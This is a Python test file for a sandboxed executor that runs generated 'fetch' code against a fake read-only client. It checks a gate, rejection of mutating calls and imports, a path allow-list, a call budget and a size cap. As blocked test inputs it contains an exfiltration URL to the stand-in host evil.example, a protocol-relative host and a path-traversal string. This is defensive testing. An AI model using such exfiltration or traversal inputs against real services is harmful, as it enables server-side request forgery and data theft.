"""Stage-A tests for the gated live-fetch executor.

Everything here runs against a FAKE client — no real Fabric, no network, no
token. It proves: the OFF gate blocks execution, a valid read-only fetch runs and
returns data, and unsafe or mutating fetch code is refused.
"""
from __future__ import annotations

import pytest

from auditfast.ai.custom_runtime.live_fetch import (
    LiveFetchDisabledError,
    load_fetch,
    run_fetch_code,
)

_VALID_FETCH = (
    "def fetch(client, workspace_id):\n"
    "    return client.get(f'/workspaces/{workspace_id}/notebooks')\n"
)


class _FakeClient:
    """A read-only client stand-in that records calls and returns canned data."""

    def __init__(self, data):
        self._data = data
        self.calls: list[str] = []

    def get(self, path: str):
        self.calls.append(path)
        return self._data


def test_gate_off_refuses_to_run_and_never_touches_client():
    client = _FakeClient({"value": []})
    with pytest.raises(LiveFetchDisabledError):
        run_fetch_code(_VALID_FETCH, client, "ws-1", enabled=False)
    assert client.calls == []  # the gate is checked before any client use


def test_valid_fetch_runs_against_fake_client():
    client = _FakeClient({"value": [{"name": "NB 1"}]})
    data, error = run_fetch_code(_VALID_FETCH, client, "ws-1", enabled=True)
    assert error is None
    assert data == {"value": [{"name": "NB 1"}]}
    assert client.calls == ["/workspaces/ws-1/notebooks"]


def test_mutating_fetch_code_is_rejected():
    mutating = (
        "def fetch(client, workspace_id):\n"
        "    return client.delete(f'/workspaces/{workspace_id}')\n"
    )
    data, error = run_fetch_code(mutating, _FakeClient(None), "ws-1", enabled=True)
    assert data is None
    assert error is not None and "rejected" in error


def test_unsafe_import_in_fetch_code_is_rejected():
    unsafe = (
        "import os\n"
        "def fetch(client, workspace_id):\n"
        "    return os.getcwd()\n"
    )
    data, error = run_fetch_code(unsafe, _FakeClient(None), "ws-1", enabled=True)
    assert data is None
    assert error is not None and "rejected" in error


def test_load_fetch_requires_a_fetch_function():
    from auditfast.ai.custom_runtime.local_runner import UnsafeCodeError

    with pytest.raises(UnsafeCodeError):
        load_fetch("def other(client, workspace_id):\n    return 1\n")


def test_fetch_runtime_error_is_reported_not_raised():
    boom = (
        "def fetch(client, workspace_id):\n"
        "    return client.get('/x')['missing_key']\n"
    )
    data, error = run_fetch_code(boom, _FakeClient([]), "ws-1", enabled=True)
    assert data is None
    assert error is not None  # a runtime error becomes a reported reason


# -- Stage-B hardening: path allow-list, call budget, size cap ----------------

def test_ssrf_absolute_url_is_blocked():
    exfil = (
        "def fetch(client, workspace_id):\n"
        "    return client.get('http://evil.example/steal')\n"
    )
    data, error = run_fetch_code(exfil, _FakeClient({"x": 1}), "ws-1", enabled=True)
    assert data is None
    assert error is not None and "path not allowed" in error


def test_protocol_relative_and_traversal_paths_blocked():
    for bad in ("//evil.example/x", "/workspaces/../../etc"):
        code = f"def fetch(client, workspace_id):\n    return client.get({bad!r})\n"
        data, error = run_fetch_code(code, _FakeClient({}), "ws-1", enabled=True)
        assert data is None
        assert error is not None and "path not allowed" in error


def test_call_budget_is_enforced():
    loop = (
        "def fetch(client, workspace_id):\n"
        "    for i in range(1000):\n"
        "        client.get(f'/workspaces/{workspace_id}/item/{i}')\n"
        "    return 'done'\n"
    )
    data, error = run_fetch_code(loop, _FakeClient({}), "ws-1", enabled=True, max_calls=5)
    assert data is None
    assert error is not None and "call budget" in error


def test_response_size_cap_is_enforced():
    big = (
        "def fetch(client, workspace_id):\n"
        "    return client.get('/workspaces/x')\n"
    )
    huge = {"blob": "x" * 5000}
    data, error = run_fetch_code(big, _FakeClient(huge), "ws-1", enabled=True, max_bytes=100)
    assert data is None
    assert error is not None and "cap" in error

